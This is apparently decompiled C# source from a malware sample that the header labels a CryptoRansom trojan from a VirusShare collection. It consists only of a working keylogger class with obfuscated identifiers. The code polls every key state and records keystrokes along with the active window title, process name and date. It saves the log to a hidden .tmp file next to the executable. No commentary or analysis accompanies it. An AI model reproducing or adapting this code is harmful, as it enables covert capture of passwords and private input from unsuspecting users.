// Decompiled with JetBrains decompiler
// Type: w.艾儿
// Assembly: Stub, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 416A03C6-1169-4785-8C8F-B7DCBEEF5946
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-3fc35088ba76418a38697f688d75da2112d50f56f6e2324a4c9897e3ed81b60f.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace w
{
  public class 艾儿
  {
    private object च;
    public object औ艾;
    private object वख;
    public object 艾吉;
    private object 儿贝;
    private object ऐ;
    public object भ;

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetKeyboardLayout(int dwLayout);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern uint MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    private string AV()
    {
      try
      {
        IntPtr foregroundWindow = 艾儿.GetForegroundWindow();
        int lpdwProcessID;
        艾儿.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
        object processById = (object) Process.GetProcessById(lpdwProcessID);
        if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object) (foregroundWindow.ToInt32() == this.ऐ), Operators.CompareObjectEqual(this.वख, NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, "Length", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))))
        {
          this.ऐ = (object) foregroundWindow.ToInt32();
          this.वख = (object) Conversions.ToString(NewLateBinding.LateGet(processById, (System.Type) null, "MainWindowTitle", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
          return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) ("\r\n\u0001" + this.HM() + " "), NewLateBinding.LateGet(processById, (System.Type) null, "ProcessName", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) " "), this.वख), (object) '\u0001'), (object) "\r\n"));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return "";
    }

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    private string HM()
    {
      string str;
      try
      {
        str = ((Clock) this.औ艾).LocalTime.ToString("yy/MM/dd");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "??/??/??";
        ProjectData.ClearProjectError();
      }
      return str;
    }

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    private static string VKCodeToUnicode(uint VKCode)
    {
      try
      {
        StringBuilder pwszBuff = new StringBuilder();
        byte[] lpKeyState = new byte[(int) byte.MaxValue];
        if (!艾儿.GetKeyboardState(lpKeyState))
          return "";
        uint wScanCode = 艾儿.MapVirtualKey(VKCode, 0U);
        IntPtr foregroundWindow = 艾儿.GetForegroundWindow();
        int lpdwProcessID = 0;
        IntPtr keyboardLayout = (IntPtr) 艾儿.GetKeyboardLayout(艾儿.GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID));
        艾儿.ToUnicodeEx(VKCode, wScanCode, lpKeyState, pwszBuff, 5, 0U, keyboardLayout);
        return pwszBuff.ToString();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) checked ((int) VKCode)).ToString();
    }

    private string Fix(Keys k)
    {
      bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(this.儿贝, (System.Type) null, "ShiftKeyDown", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(this.儿贝, (System.Type) null, "CapsLock", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))
        flag = !flag;
      string str;
      try
      {
        Keys keys = k;
        str = keys == Keys.F1 || keys == Keys.F2 || keys == Keys.F3 || keys == Keys.F4 || keys == Keys.F5 || keys == Keys.F6 || keys == Keys.F7 || keys == Keys.F8 || keys == Keys.F9 || keys == Keys.F10 || keys == Keys.F11 || keys == Keys.F12 || keys == Keys.End || keys == Keys.Delete || keys == Keys.Back ? "[" + k.ToString() + "]" : (keys == Keys.LShiftKey || keys == Keys.RShiftKey || keys == Keys.Shift || keys == Keys.ShiftKey || keys == Keys.Control || keys == Keys.ControlKey || keys == Keys.RControlKey || keys == Keys.LControlKey || keys == Keys.Alt ? "" : (keys != Keys.Space ? (keys == Keys.Return || keys == Keys.Return ? (!((string) this.艾吉).EndsWith("[ENTER]\r\n") ? "[ENTER]\r\n" : "") : (keys != Keys.Tab ? (!flag ? 艾儿.VKCodeToUnicode(checked ((uint) k)) : 艾儿.VKCodeToUnicode(checked ((uint) k)).ToUpper()) : "[TAP]\r\n")) : " "));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          str = Strings.ChrW((int) k).ToString().ToUpper();
          ProjectData.ClearProjectError();
        }
        else
        {
          str = Strings.ChrW((int) k).ToString().ToLower();
          ProjectData.ClearProjectError();
        }
      }
      return str;
    }

    public 艾儿()
    {
      this.च = (object) 0;
      this.औ艾 = (object) new Clock();
      this.艾吉 = (object) "";
      this.儿贝 = (object) new Keyboard();
      this.भ = (object) (Assembly.GetExecutingAssembly().Location + ".tmp");
    }

    public void WRK()
    {
      try
      {
        this.艾吉 = (object) File.ReadAllText((string) this.भ);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        int num1 = 0;
        while (true)
        {
          checked { ++num1; }
          int vKey = 0;
          do
          {
            if (艾儿.GetAsyncKeyState(vKey) == (short) -32767)
            {
              Keys k = (Keys) vKey;
              string str = this.Fix(k);
              if (str.Length > 0)
              {
                this.艾吉 = (object) ((string) this.艾吉 + this.AV());
                this.艾吉 = (object) ((string) this.艾吉 + str);
              }
              this.च = (object) (int) k;
            }
            checked { ++vKey; }
          }
          while (vKey <= (int) byte.MaxValue);
          if (num1 == 1000)
          {
            num1 = 0;
            int num2 = 20480;
            if (((string) this.艾吉).Length > num2)
              this.艾吉 = (object) ((string) this.艾吉).Remove(0, checked (((string) this.艾吉).Length - num2));
            File.WriteAllText((string) this.भ, (string) this.艾吉);
          }
          Thread.Sleep(1);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
